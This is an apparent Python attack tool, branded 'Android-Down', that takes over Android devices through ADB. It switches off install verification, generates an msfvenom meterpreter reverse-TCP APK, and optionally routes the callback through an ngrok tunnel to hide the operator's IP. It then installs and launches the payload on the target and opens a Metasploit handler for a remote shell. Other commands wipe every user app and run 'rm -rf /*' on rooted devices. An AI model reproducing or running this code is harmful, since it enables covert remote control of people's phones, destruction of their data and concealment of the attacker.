#Pull requests are welcome!
#
#Made by kikiokol

import subprocess
import platform
import os
from pyngrok import ngrok
from termcolor import colored
from threading import Thread

OS = platform.system()

if("open_metasploit_on_start" in open("config.conf").read()):   
    os.system("msfconsole -x 'exit'")

cmdb = {
    "start" : "commands.run()",
    "list-apps" : "commands.listApps()",
    "rdp-start" : "commands.rdp_start()",
    "meterpreter-start" : "commands.meterpreter('start')",
    "meterpreter-install" : "commands.meterpreter('install')",
    "install" : "commands.adb_install()",
    "uninstall" : "commands.adb_uninstall()",
    "uninstall-all" : "commands.Uninstall_all()",
    "shell" : "os.system(\"adb shell\")",
    "get-users" : "commands.get_users()",
    "restart" : "commands.restart()",
    "destroy" : "commands.destroy()",
    "help" : "commands.help()",
    "exit" : "exit()",
    "clear" : "commands.clear()"
    }

initmsg = """
█████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗       ██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗      ██╔══██╗██╔═══██╗██║    ██║████╗  ██║
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║█████╗██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║╚════╝██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║██████╔╝      ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝       ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝   



"""

class commands():
    def help():
        print("Available commands:\n")
        for key, value in cmdb.items():
            print(key)
        print()

    def clear():
        if("Linux" in OS or "Unix" in OS):
            os.system("clear")
        else:
            os.system("cls")

    def cli_command(command: str):
        output = subprocess.check_output(command, shell=True).decode()
        return output

    def adb_install():
        apkPath = input("(APK path)... ")
        commands.cli_command("adb shell settings put global install_non_market_apps 1")
        try:
            output = commands.cli_command("adb install " + apkPath)
            print(output)
        except:
            print("Sorry, an error occurred.")

    def adb_uninstall():
        packageName = input("(Package name)... ")
        commands.cli_command("adb shell pm uninstall " + packageName)
    
    def Uninstall_all():
        output = commands.cli_command("adb shell pm list packages -f | grep /data/app").splitlines()
        for o in output:
            try:
                commands.cli_command("adb shell pm uninstall " + o.split("base.apk=")[1])
            except:
                print(colored("WARNING: Could not uninstall " + o.split("base.apk=")[1], "yellow"))

    def rdp_start():
        subprocess.Popen("/bin/scrcpy", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def connect(ip: str):
        output = commands.cli_command("adb connect " + ip)
        if("connected" in output):
            return 0
        else:
            return 1
    
    def run():
        package = input("(Package)... ")
        output = commands.cli_command("adb shell monkey -p {} -c android.intent.category.LAUNCHER 1".format(package))
        if(len(output) > 0):
            print("ERROR: " + output)

    def listApps():
        output = commands.cli_command("adb shell pm list packages -f | grep /data/app").splitlines()
        for o in output:
            print(o.split("base.apk=")[1])

    def meterpreter(action: str):
        try:
            print(colored("NOTE: It is recommended to run rdp with this command in case the device has an antivirus enabled.", "yellow")) #It's true

            commands.cli_command("adb shell settings put global install_non_market_apps 1") #Allow unknown apps
            commands.cli_command("adb shell settings put global verifier_verify_adb_installs 0")
            yorn = input("Use ngrok to hide your ip(y/n)? ")
            if(yorn == "y"):
                tunnel = ngrok.connect(4444, "tcp") #Connect to an ngrok tunnel
                #Trim string to extract domain and port
                url = str(tunnel.public_url).replace("tcp://", "")
                ip = url.split(":")[0].replace(":", "")
                port = int(url.split(":")[1])
            else:
                ip = input("(Local ip)... ")
                port = 4444

            commands.cli_command("msfvenom -p android/meterpreter_reverse_tcp LHOST={} LPORT={} -o /tmp/meterpreter.apk".format(ip, port)) #Generate the payload
            try:
                commands.cli_command("adb uninstall com.metasploit.stage")
            except:
                pass
            commands.cli_command("adb install /tmp/meterpreter.apk") #Install it on the target device
            commands.cli_command("rm /tmp/meterpreter.apk") #Remove from local device so that it doesn't use up space

            if(action == "install"):
                print()
                print("Run: msfconsole -x \"use multi/handler; set payload android/meterpreter_reverse_tcp; set lhost 0.0.0.0; set lport 4444; exploit\" to start the handler.")
                print("Use the 'start' command and type 'com.metasploit.stage' to run the payload.")
            else:
                commands.cli_command("adb shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1")
                os.system("msfconsole -x \"use multi/handler; set payload android/meterpreter_reverse_tcp; set lhost 0.0.0.0; set lport 4444; exploit\"")
        except Exception as error:
            print(colored("ERROR: " + str(error), "red"))
    
    def get_users():
        print(commands.cli_command("adb shell pm list users"))
    
    def destroy():
        if(commands.checkroot() == "Device is not rooted."):
            print(colored("ERROR: Device has to be rooted.", "red"))
        else:
            print(colored("WARNING: This will delete EVERYTHING on the target.", "red"))
            sure = input("Type 'IAMSOSURE' in all caps to continue: ")
            if(sure == "AIMSOSURE"):
                commands.cli_command("adb shell rm -rf /*")
            else:
                print(colored("Destroy: Cancelled.", "red"))
    
    def restart():
        commands.cli_command("adb shell am broadcast -a android.intent.action.BOOT_COMPLETED")

commands.clear()

print(colored(initmsg, "red"))

print(colored("Use skip if a device is already connected.", "blue"))

#Connect to target

while True:
    connected = input("IP >> ")
    if(len(connected) > 0):
        if(connected == "skip"):
            connected = "Unknown"
            break
        elif(commands.connect(connected) == 0):
            break
        else:
            print(colored("Error: Could not connect.", "red"))

#Handle commands

while True:
    cmd = input(colored(connected, "blue") + " >> ")
    if(len(cmd) != 0):
        if(cmd in cmdb):
            try:
                exec(cmdb[cmd])
            except Exception as error:
                print("Sorry, an error occured while executing command: " + colored(str(error), "red"))
        elif(cmd.split(" ")[0] in os.listdir("/bin/")):
            os.system(cmd)
        else:
            print(colored("ERROR: Command not found.", "red"))